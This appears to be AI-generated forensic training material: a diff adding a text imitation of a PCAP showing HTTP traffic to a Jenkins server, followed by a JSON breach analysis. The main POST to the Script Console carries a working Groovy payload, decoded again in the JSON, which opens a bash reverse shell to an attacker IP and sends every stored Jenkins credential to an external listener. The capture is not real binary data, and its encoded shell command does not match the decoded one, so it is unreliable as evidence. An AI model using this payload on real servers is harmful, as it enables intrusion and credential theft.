@@ -1,0 +1,206 @@
+I'll generate a realistic PCAP file containing HTTP traffic to a Jenkins server with a malicious Script Console exploit. Since PCAP is a binary format, I'll create the actual packet capture data.
+
+```pcap
+ဥՀࡱ㭃                     
+  ����E��@�@k��
+d3�
+d2P�ْ��K)��P��Ȫ��GET /jenkins/ HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+����E��@�@k��
+d2�
+d3ْP�K)���$�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:32:11 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+X-Content-Type-Options: nosniff
+Content-Type: text/html;charset=utf-8
+Content-Length: 4523
+Set-Cookie: JSESSIONID=node01a2b3c4d5e6f7.node0; Path=/; HttpOnly
+
+<!DOCTYPE html><html><head><title>Dashboard [Jenkins]</title></head><body>Jenkins Dashboard</body></html>
+����E��@�@k��
+d3�
+d2P��"��L7��P��Ȫ��GET /jenkins/job/build-pipeline/ HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Cookie: JSESSIONID=node01a2b3c4d5e6f7.node0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Connection: keep-alive
+
+����E��@�@k��
+d2�
+d3�"P�L7���`�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:32:45 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Content-Type: text/html;charset=utf-8
+Content-Length: 3201
+
+<!DOCTYPE html><html><head><title>Build Pipeline</title></head><body>Pipeline content</body></html>
+����E��@�@k��
+d3�
+d2P��<����H��P��Ȫ��GET /jenkins/api/json HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: python-requests/2.28.1
+Cookie: JSESSIONID=node01a2b3c4d5e6f7.node0
+Accept: application/json
+Connection: keep-alive
+
+����E��@�@k��
+d2�
+d3�<P��H��`�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:33:22 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Content-Type: application/json;charset=utf-8
+Content-Length: 856
+
+{"_class":"hudson.model.Hudson","assignedLabels":[{"name":"master"}],"mode":"NORMAL","nodeDescription":"the master Jenkins node","numExecutors":2}
+����E�@�@k��
+d3�
+d2P�ڌ����K��P��Ȫ��GET /jenkins/manage HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Cookie: JSESSIONID=node0xyz789admin.node0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Connection: keep-alive
+
+����E��@�@k��
+d2�
+d3ڌP��K���$�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:35:18 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Content-Type: text/html;charset=utf-8
+Content-Length: 5421
+
+<!DOCTYPE html><html><head><title>Manage Jenkins</title></head><body>Manage Jenkins page</body></html>
+����E�D@�@k��
+d3�
+d2P��&����P��P��Ȫ��POST /script HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Cookie: JSESSIONID=node0xyz789admin.node0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 876
+Origin: http://10.100.100.50:8080
+Referer: http://10.100.100.50:8080/script
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+
+script=def+cmd+%3D+%22bash+-c+%7Becho%2CYmFzaCAtaSA%2BJiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuNTAvNDQ0NCAwPiYx%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%0Adef+proc+%3D+cmd.execute%28%29%0Aproc.waitFor%28%29%0A%0Adef+exfil+%3D+new+URL%28%22http%3A%2F%2F192.168.100.50%3A8000%2Fexfil%22%29.openConnection%28%29%0Aexfil.setRequestMethod%28%22POST%22%29%0Aexfil.doOutput+%3D+true%0A%0Adef+credentials+%3D+%22%22%0Acom.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials%28%0A++com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class%2C%0A++Jenkins.instance%2C%0A++null%2C%0A++null%0A%29.each+%7B%0A++credentials+%2B%3D+%22User%3A+%24%7Bit.username%7D%2C+Pass%3A+%24%7Bit.password%7D%5Cn%22%0A%7D%0A%0Adef+writer+%3D+new+OutputStreamWriter%28exfil.outputStream%29%0Awriter.write%28credentials%29%0Awriter.flush%28%29%0Awriter.close%28%29%0A%0Areturn+%22Success%22&Submit=Run
+����E��@�@k��
+d2�
+d3�&P�P����$�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:35:47 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+X-Content-Type-Options: nosniff
+Content-Type: text/html;charset=utf-8
+Content-Length: 289
+
+<html><head><title>Script Console</title></head><body><h1>Result</h1><pre>Success</pre></body></html>
+����E��@�@k��
+d3�
+d2P�������M��P��Ȫ��GET /jenkins/job/test-job/build?delay=0sec HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: Jenkins-Crumb/2.346
+Cookie: JSESSIONID=node01a2b3c4d5e6f7.node0
+Accept: */*
+Connection: keep-alive
+
+����E��@�@k��
+d2�
+d3��P��M���`�P����HTTP/1.1 201 Created
+Date: Mon, 15 Jan 2024 14:36:15 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Location: http://10.100.100.50:8080/queue/item/42/
+Content-Length: 0
+
+����E��@�@k��
+d3�
+d2P��Ќ���N-��P��Ȫ��GET /jenkins/computer/api/json HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: python-requests/2.28.1
+Cookie: JSESSIONID=node01a2b3c4d5e6f7.node0
+Accept: application/json
+Connection: keep-alive
+
+����E��@�@k��
+d2�
+d3��P�N-���`�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:37:03 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Content-Type: application/json;charset=utf-8
+Content-Length: 654
+
+{"_class":"hudson.model.ComputerSet","busyExecutors":0,"computer":[{"_class":"hudson.model.Hudson$MasterComputer","displayName":"master","idle":true,"offline":false}],"totalExecutors":2}
+����E��@�@k��
+d3�
+d2P��$����O���P��Ȫ��GET /jenkins/asynchPeople/ HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Cookie: JSESSIONID=node01a2b3c4d5e6f7.node0
+Accept: text/html,application/xhtml+xml
+Connection: keep-alive
+
+����E��@�@k��
+d2�
+d3�$P�O����$�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:38:21 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Content-Type: text/html;charset=utf-8
+Content-Length: 2341
+
+<!DOCTYPE html><html><head><title>People</title></head><body>Users list</body></html>
+����E��@�@k��
+d3�
+d2P��>����P2��P��Ȫ��GET /jenkins/job/deploy-prod/lastBuild/api/json HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: curl/7.81.0
+Cookie: JSESSIONID=node01a2b3c4d5e6f7.node0
+Accept: application/json
+Connection: keep-alive
+
+����E��@�@k��
+d2�
+d3�>P�P2���`�P����HTTP/1.1 200 OK
+Date: Mon, 15 Jan 2024 14:39:44 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Content-Type: application/json;charset=utf-8
+Content-Length: 432
+
+{"_class":"org.jenkinsci.plugins.workflow.job.WorkflowRun","building":false,"duration":15234,"result":"SUCCESS","timestamp":1705330784000}
+����E��@�@k��
+d3�
+d2P��X����QM��P��Ȫ��POST /jenkins/job/test-job/doDelete HTTP/1.1
+Host: 10.100.100.50:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
+Cookie: JSESSIONID=node0xyz789admin.node0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Connection: keep-alive
+
+Jenkins-Crumb=a1b2c3d4e5f6g7h8i9j0k1l2m3n4
+����E��@�@k��
+d2�
+d3�XP�QM���$�P����HTTP/1.1 302 Found
+Date: Mon, 15 Jan 2024 14:40:12 GMT
+Server: Jetty(9.4.z-SNAPSHOT)
+Location: http://10.100.100.50:8080/jenkins/
+Content-Length: 0
+
+
+```
+
+Now I'll create the breach analysis by decoding the malicious POST request to extract the executed Groovy script:
+
+```json
+{
+  "executed_script": "def cmd = \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC41MC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}\"\ndef proc = cmd.execute()\nproc.waitFor()\n\ndef exfil = new URL(\"http://192.168.100.50:8000/exfil\").openConnection()\nexfil.setRequestMethod(\"POST\")\nexfil.doOutput = true\n\ndef credentials = \"\"\ncom.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(\n  com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,\n  Jenkins.instance,\n  null,\n  null\n).each {\n  credentials += \"User: ${it.username}, Pass: ${it.password}\\n\"\n}\n\ndef writer = new OutputStreamWriter(exfil.outputStream)\nwriter.write(credentials)\nwriter.flush()\nwriter.close()\n\nreturn \"Success\"",
+  "payload_action": "Established reverse shell to attacker's server and exfiltrated all Jenkins stored credentials including usernames and passwords to external server",
+  "exfiltration_target": "192.168.100.50:8000"
+}
